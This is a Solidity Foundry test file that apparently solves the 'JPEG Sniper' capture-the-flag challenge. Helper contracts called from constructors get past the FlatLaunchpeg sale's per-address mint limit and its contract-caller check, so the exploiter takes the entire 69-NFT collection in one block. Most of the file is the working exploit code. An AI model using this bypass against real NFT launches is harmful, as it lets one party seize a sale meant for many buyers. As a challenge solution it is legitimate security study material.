// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {FlatLaunchpeg} from "../src/jpeg-sniper/FlatLaunchpeg.sol";

contract JpegSniper is Test {
    FlatLaunchpeg public flatLaunchpeg;
    EXP public exp;
    uint256 constant COLLECTION_SIZE = 69;
    uint256 constant MAX_BATCH_SIZE = 5;
    uint256 constant MAX_PER_ADDRESS_DURING_MINT = 5;
    address exploiter;
    uint256 blockNumber;

    function setUp() public {
        exploiter = makeAddr("exploiter");
        flatLaunchpeg = new FlatLaunchpeg(COLLECTION_SIZE, MAX_BATCH_SIZE, MAX_PER_ADDRESS_DURING_MINT);
        blockNumber = block.number;

        vm.label(address(flatLaunchpeg), "FlatLaunchpeg");

        assertEq(flatLaunchpeg.totalSupply(), 0);

        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 12);
    }

    function testExploit() public {
        console.log("Before attack,the NFT balance of exploiter:", flatLaunchpeg.balanceOf(exploiter));
        vm.startPrank(exploiter);
        exp = new EXP(flatLaunchpeg, exploiter);
        vm.stopPrank();
        verify();
        console.log("After attack,the NFT balance of exploiter:", flatLaunchpeg.balanceOf(exploiter));
    }

    function verify() internal {
        assertEq(flatLaunchpeg.totalSupply(), 69);
        assertEq(flatLaunchpeg.balanceOf(exploiter), 69);
        assertEq(block.number, blockNumber + 1);
        console.log(unicode"😄 pwn! ");
    }
}

/*##############################EXPLOIT##############################*/
contract EXP {
    constructor(FlatLaunchpeg Launchpeg, address receiver) {
        uint256 collectionSize = Launchpeg.collectionSize();
        uint256 maxPerAddressDuringMint = Launchpeg.maxPerAddressDuringMint();
        uint256 loop = collectionSize / maxPerAddressDuringMint;
        uint256 NFTIndex = Launchpeg.totalSupply();
        for(uint256 i; i < loop; ++i){
            new NFTMinter(Launchpeg, receiver, NFTIndex);
            NFTIndex = NFTIndex + maxPerAddressDuringMint;
        }
        uint256 NFTRemainder = collectionSize % maxPerAddressDuringMint;
        Launchpeg.publicSaleMint(NFTRemainder);
        for(uint256 i; i < NFTRemainder; ++i){
            Launchpeg.safeTransferFrom(address(this), receiver,  NFTIndex + i);
        }
        selfdestruct(payable(receiver));
    }
}

contract NFTMinter {
    constructor(FlatLaunchpeg Launchpeg, address receiver, uint256 NFTIndex) {
        uint256 maxPerAddressDuringMint = Launchpeg.maxPerAddressDuringMint();
        uint256 length = Launchpeg.maxPerAddressDuringMint();
        Launchpeg.publicSaleMint(maxPerAddressDuringMint);
        for(uint256 i; i < length; ++i){
            Launchpeg.safeTransferFrom(address(this), receiver,  NFTIndex + i);
        }
        selfdestruct(payable(receiver));
    }
}
